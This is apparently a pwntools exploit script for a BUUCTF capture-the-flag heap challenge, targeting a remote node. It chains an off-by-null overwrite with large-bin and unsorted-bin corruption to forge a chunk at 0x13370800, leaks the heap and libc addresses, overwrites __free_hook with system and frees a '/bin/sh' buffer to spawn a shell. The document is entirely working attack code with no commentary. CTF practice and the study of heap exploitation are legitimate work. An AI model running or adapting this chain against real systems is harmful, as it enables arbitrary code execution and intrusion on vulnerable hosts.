from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
context.log_level = 'debug'

#io = process("./pwn")
#elf = ELF("./pwn")
#libc = elf.libc
#libc = ELF("/home/isidro/pwnh/buuctf/libc/u16-x64.so")

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Command: '
def add(size):
	sla(menu, b'1')
	sla(b'Size: ', byte(size))

def edit(idx, data):
	sla(menu, b'2')
	sla(b'Index: ', byte(idx))
	sla(b'Size: ', byte(len(data)))
	sda(b'Content: ', data)

def dele(idx):
	sla(menu, b'3')
	sla(b'Index: ', byte(idx))	

def show(idx):
	sla(menu, b'4')
	sla(b'Index: ', byte(idx))

flag = True
while flag:
	#flag = False
	if True:
		io = remote('node4.buuoj.cn', 28579)
		libc = ELF("/home/isidro/pwnh/buuctf/libc/u16-x64.so")
	else:
		io = process("./pwn")
		elf = ELF("./pwn")
		libc = elf.libc
	
	add(0x18)  # 0
	add(0x508) # 1
	add(0x18)  # 2
	edit(1, b'\x00'*0x4f0+p64(0x500))

	add(0x18)  # 3
	add(0x508) # 4
	add(0x18)  # 5
	edit(4, b'\x00'*0x4f0+p64(0x500))

	add(0x18)  # 6 --> avoid top_chunk merge

	dele(1)      # 1
	edit(0, b'\x00'*(0x18-12))
	add(0x18)  # 1
	add(0x4d8) # 7 --> control unsorted bin chunk - 0x10
	dele(1)      # 1
	dele(2)      # 2
	add(0x38)  # 1
	add(0x4e8) # 2 --> unsorted bin chunk

	dele(4)      # 4
	edit(3, b'\x00'*(0x18-12))
	add(0x18)  # 4
	add(0x4d8) # 8 --> control large bin chunk - 0x20 
	dele(4)      # 4
	dele(5)      # 5
	add(0x48)  # 4

	dele(2)      # 2
	add(0x4E8) # 2
	dele(2)      # 2

	fake_chunk = 0x13370800 - 0x10
	pay = p64(0)*3 + p64(0x4f1) + p64(0) + p64(fake_chunk)
	edit(7, pay)

	pay = p64(0)*5 + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
	edit(8, pay)
	try:
		add(0x48) # 2
		rut(b'1.')
		break
	except Exception as e:
		io.close()
		continue

pay = p64(0)*3 + p64(0x13377331) + p64(0x13370820) +  p64(0x100)
edit(2, pay)

pay = p64(0x13370820) + p64(0x100) + p64(fake_chunk+3) + p64(8)
edit(0, pay)
show(1)
rut(b']: ')
heap = addr(6)
info('heap', heap)

pay = p64(0x13370820) + p64(0x100) + p64(heap+0x10) + p64(8)
edit(0, pay)
show(1)
rut(b']: ')
libc.address = addr(6) - 0x3c4b78
info('libc_base', libc.address)

system = libc.sym.system
free_hook = libc.sym.__free_hook

pay = p64(free_hook) + p64(8) + p64(0x13370820+0x20) + p64(16) + b'/bin/sh\x00'
edit(0, pay)
edit(0, p64(system))
dele(1)
#debug()
sh()
